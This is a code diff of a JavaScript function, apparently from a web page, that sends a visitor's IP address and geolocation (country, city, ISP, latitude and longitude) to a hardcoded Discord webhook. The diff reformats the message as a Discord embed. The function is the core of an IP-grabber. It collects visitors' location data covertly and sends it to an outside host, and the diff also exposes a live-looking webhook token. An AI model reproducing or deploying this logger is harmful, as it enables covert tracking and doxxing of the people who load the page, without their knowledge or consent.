@@ -27,15 +27,39 @@
         async function sendToDiscord(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1266889183943987321/oDW3IA3FDUMxvAlrRhj5c1f7xfTmSP6sTOBFCQUtaFAS_TwdGNQBLs0oMHbGyfamXVL_'; // Replace with your Discord webhook URL
             const location = data.location || {};
+            const imageURL = "https://i.ibb.co/JCPBJzB/image.png";
+
             const payload = {
-                content: `User IP Address: ${data.ip}\n` +
-                         `Country: ${location.country_name || 'N/A'}\n` +
-                         `Region: ${location.region_name || 'N/A'}\n` +
-                         `City: ${location.city || 'N/A'}\n` +
-                         `ISP: ${location.isp || 'N/A'}\n` +
-                         `Organization: ${location.organization || 'N/A'}\n` +
-                         `Latitude: ${location.latitude || 'N/A'}\n` +
-                         `Longitude: ${location.longitude || 'N/A'}`
+                content: null,
+                embeds: [
+                    {
+                        color: null,
+                        fields: [
+                            {
+                                name: "IP:",
+                                value: `${data.ip}`
+                            },
+                            {
+                                name: "Location:",
+                                value: `IP Address:\n${data.ip}\n\n` +
+                                       `Country:\n${location.country_name || 'N/A'}\n\n` +
+                                       `Region:\n${location.region_name || 'N/A'}\n\n` +
+                                       `City:\n${location.city || 'N/A'}\n\n` +
+                                       `ISP:\n${location.isp || 'N/A'}\n\n` +
+                                       `Organization:\n${location.organization || 'N/A'}\n\n` +
+                                       `Latitude:\n${location.latitude || 'N/A'}\n\n` +
+                                       `Longitude:\n${location.longitude || 'N/A'}`
+                            }
+                        ],
+                        author: {
+                            name: "IP & Info"
+                        },
+                        thumbnail: {
+                            url: imageURL
+                        }
+                    }
+                ],
+                attachments: []
             };
 
             try {
